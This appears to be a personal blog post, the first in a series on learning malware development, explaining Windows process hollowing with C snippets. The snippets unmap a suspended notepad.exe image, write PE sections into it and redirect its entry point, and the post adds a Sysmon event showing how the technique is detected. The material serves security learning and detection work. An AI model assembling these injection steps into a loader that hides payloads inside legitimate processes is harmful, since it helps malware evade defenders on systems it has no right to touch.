I've wanted to learn malware development properly for a long time, mostly because I keep reading reports about techniques and feeling like I'm reading a foreign language with a dictionary. So I'm starting a series — **Maldev 0xNN** — where each post is a small, working piece of code and the things I broke on the way there.

This first one is *process hollowing*: spawn a benign process suspended, scoop out its memory, and load a different PE in its place. Old, well-documented, still on the OSCE+ syllabus. Good place to start.

## The plan, in seven moves

1. Create a target process (e.g. `notepad.exe`) with `CREATE_SUSPENDED`.
2. Read its `PEB` via `GetThreadContext` + `ReadProcessMemory`.
3. Unmap the original image with `NtUnmapViewOfSection`.
4. Allocate a new region at the original ImageBase.
5. Write our payload's headers and sections in.
6. Patch `EAX` / `RCX` to the new entry point.
7. `ResumeThread` and pray.

## Step 3: NtUnmapViewOfSection

This is the one that bit me. `NtUnmapViewOfSection` isn't in `kernel32.lib`; you grab it dynamically from `ntdll`. Easy to miss when you're following a 2017 blog post that "just worked."

```c
// resolve NtUnmapViewOfSection at runtime
typedef NTSTATUS (NTAPI *pNtUnmap)(HANDLE, PVOID);

HMODULE ntdll = GetModuleHandleA("ntdll.dll");
pNtUnmap NtUnmapViewOfSection =
    (pNtUnmap)GetProcAddress(ntdll, "NtUnmapViewOfSection");

if (!NtUnmapViewOfSection) return -1;

NTSTATUS status = NtUnmapViewOfSection(
    pi.hProcess,
    (PVOID)imageBase   // from target's PEB
);
```

Two things I got wrong the first time:

- I cast `imageBase` as a 32-bit value on a 64-bit target. `NTSTATUS` came back `0xC0000018` (`STATUS_CONFLICTING_ADDRESSES`) and I spent an hour blaming ASLR.
- I forgot to `VirtualAllocEx` with `PAGE_EXECUTE_READWRITE`. The unmap succeeds; the rewrite quietly fails because the new region is r/w only.

> If `WriteProcessMemory` returns `TRUE` but your bytes aren't there, you wrote into a guard page or a region that was never committed. Always re-read.

## Step 5: writing sections, one at a time

The headers go at the new ImageBase. Each `IMAGE_SECTION_HEADER` tells you where its bytes live in the file (`PointerToRawData`) and where to put them in memory (`VirtualAddress`). You walk the array and copy:

```c
for (DWORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    PIMAGE_SECTION_HEADER sec = &sections[i];

    WriteProcessMemory(
        pi.hProcess,
        (LPVOID)((DWORD_PTR)imageBase + sec->VirtualAddress),
        payload + sec->PointerToRawData,
        sec->SizeOfRawData,
        NULL
    );
}
```

If you're using a payload built with `/DYNAMICBASE` and the new ImageBase doesn't match its preferred base, you also have to walk the relocation table and patch every entry. I'm skipping that for this post — it's the next one.

## Step 6: the entry-point poke

Last interesting bit. We have to tell the suspended thread "your new `RIP` is over here." On x64 you fetch the `CONTEXT`, set `Rcx` to the new entry, and write it back:

```c
CONTEXT ctx = { 0 };
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &ctx);

// x64 Windows passes the entry point in Rcx
ctx.Rcx = (DWORD64)imageBase + nt->OptionalHeader.AddressOfEntryPoint;

SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

## What actually happens when you run it

On a clean Windows 11 23H2 box with Defender disabled, the hollowed `notepad.exe` launches my payload silently. Task manager still shows `notepad.exe`. Process Explorer shows the right command line. Sysmon, predictably, does *not* agree:

```xml
<Event>
  <EventID>10</EventID>   <!-- ProcessAccess -->
  <SourceImage>hollow.exe</SourceImage>
  <TargetImage>notepad.exe</TargetImage>
  <GrantedAccess>0x1F0FFF</GrantedAccess>
  <CallTrace>ntdll.dll+a3c14|KERNELBASE.dll+...</CallTrace>
</Event>
```

`0x1F0FFF` is `PROCESS_ALL_ACCESS`, which is unusual on its own; combined with a `WriteProcessMemory` + `SetThreadContext` sequence on a suspended child, any half-decent EDR will flag this in 2026. Which is the point of a 0x01 post — it works, it's loud, and now I know what every detection rule is actually staring at.
